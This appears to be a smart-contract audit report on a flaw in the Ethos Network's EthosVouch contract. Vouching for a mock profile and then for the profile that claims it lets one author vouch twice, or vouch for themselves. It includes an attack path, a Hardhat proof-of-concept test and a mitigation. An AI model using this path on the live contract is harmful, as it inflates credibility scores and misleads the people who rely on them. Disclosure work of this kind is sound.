# Users can vouch for the same profile multiple times

### Summary

When a user vouches for a mock profile that is later claimed by a registered profile, the same author can still vouch for the claimer. As a result, a user could vouch multiple times for the same profileId if they vouch for both the claimer and the mock profile that is claimed, as this would bypass the check in [EthosVouch::vouchByProfileId()](https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/57c02df7c56f0b18c681a89ebccc28c86c72d8d8/ethos/packages/contracts/contracts/EthosVouch.sol#L368-L369).

### Root Cause

It is never checked if the author has already vouched for a mock that the subject has claimed.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. Alice calls `EthosVouch::vouchByProfileId()` to vouch for mock profile A.
2. Bob registers mock profile A to his profile, resulting in the vouch for the mock being associated with his profile.
3. Alice calls `EthosVouch::vouchByProfileId()` to vouch for Bob's profile. Now Bob's profile has multiple vouches from the same author associated with his profile.

### Impact

Vouchers should not be allowed to vouch for the same profile multiple times. However, this restriction can easily be bypassed, potentially resulting in a profile receiving more vouches than the maximum allowed from the same author. This means that the credibility score of a profile could be significantly increased by a single author.

Additionally, a user can create a mock profile, vouch for it, and later claim that mock profile as their own, resulting in a self-vouch.

### PoC

Before adding the test, this needs to be added in `EthosVouch.test.ts`:

```solidity
import { type HardhatEthersSigner } from '@nomicfoundation/hardhat-ethers/signers.js';
import { type EthosReview } from '../typechain-types/index.js';
import { common } from './utils/common.js';

const Score = {
  Negative: 0,
  Neutral: 1,
  Positive: 2,
};

type AttestationDetails = {
  account: string;
  service: string;
};
const defaultComment = 'default comment';
const defaultMetadata = JSON.stringify({ itemKey: 'item value' });

async function allowPaymentToken(
  admin: HardhatEthersSigner,
  ethosReview: EthosReview,
  paymentTokenAddress: string,
  isAllowed: boolean,
  priceEth: bigint,
): Promise<void> {
  await ethosReview.connect(admin).setReviewPrice(isAllowed, paymentTokenAddress, priceEth);
}
```

The following test can now be added to `EthosVouch.test.ts`:

```solidity
    it('should succeed if vouch for profile that claimed a vouched mock', async () => {
      const {
        ethosProfile,
        ethosReview,
        ethosVouch,
        ADMIN,
        OWNER,
        PROFILE_CREATOR_0,
        PROFILE_CREATOR_1,
        OTHER_0,
        EXPECTED_SIGNER,
        VOUCHER_0,
      } = await loadFixture(deployFixture);
  
      await ethosProfile.connect(OWNER).inviteAddress(PROFILE_CREATOR_0.address);
      await ethosProfile.connect(PROFILE_CREATOR_0).createProfile(1);
  
      const reviewPrice = ethers.parseEther('1.23456789');
      await allowPaymentToken(ADMIN, ethosReview, ethers.ZeroAddress, true, reviewPrice);
  
      const params = {
        score: Score.Positive,
        subject: OTHER_0.address,
        paymentToken: ethers.ZeroAddress,
        comment: defaultComment,
        metadata: defaultMetadata,
        attestationDetails: {
          account: '',
          service: '',
        } satisfies AttestationDetails,
      };
  
      await ethosReview
        .connect(PROFILE_CREATOR_0)
        .addReview(
          params.score,
          params.subject,
          params.paymentToken,
          params.comment,
          params.metadata,
          params.attestationDetails,
          { value: reviewPrice },
        );
  
      await ethosProfile.connect(OWNER).inviteAddress(PROFILE_CREATOR_1.address);
      await ethosProfile.connect(PROFILE_CREATOR_1).createProfile(1);

      await ethosProfile.connect(OWNER).inviteAddress(VOUCHER_0.address);
      await ethosProfile.connect(VOUCHER_0).createProfile(1);
  
      expect(await ethosProfile.profileIdByAddress(OTHER_0.address)).to.be.equal(
        3,
        'wrong mock Id',
      );
        
      await ethosVouch.connect(VOUCHER_0).vouchByProfileId(3, DEFAULT_COMMENT, DEFAULT_METADATA, {
        value: ethers.parseEther('1.1'),
      });

      expect(await ethosVouch.vouchCount()).to.equal(1, 'Wrong vouchCount');

      // mock is registered with a profile
      const signature = await common.signatureForRegisterAddress(
        OTHER_0.address,
        '4',
        '29548234957',
        EXPECTED_SIGNER,
      );
        
      await ethosProfile
        .connect(PROFILE_CREATOR_1)
        .registerAddress(OTHER_0.address, 4, 29548234957, signature);
  
      // profile Id for mock changes
      expect(await ethosProfile.profileIdByAddress(OTHER_0.address)).to.be.equal(
        4,
        'wrong profileId',
      );

      await ethosVouch.connect(VOUCHER_0).vouchByProfileId(4, DEFAULT_COMMENT, DEFAULT_METADATA, {
        value: ethers.parseEther('1.1'),
      });

      expect(await ethosVouch.vouchCount()).to.equal(2, 'Wrong vouchCount');
    });
```

### Mitigation

The simplest mitigation would be to disallow vouching for mock profiles. However, if that is not an option, it should be verified whether the subject has claimed a mock profile that the author has already vouched for.
